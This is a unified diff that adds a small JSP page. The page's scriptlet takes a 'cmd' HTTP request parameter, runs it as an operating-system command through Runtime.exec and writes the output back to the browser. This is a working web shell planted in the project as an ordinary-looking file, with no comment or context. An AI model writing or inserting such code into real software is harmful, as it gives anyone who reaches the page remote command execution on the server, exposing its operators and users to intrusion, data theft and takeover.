@@ -1,0 +1,10 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    java.io.InputStream in = p.getInputStream();
+    int a; while((a=in.read())!=-1) out.print((char)a);
+}
+</jsp:scriptlet>
+</jsp:root>
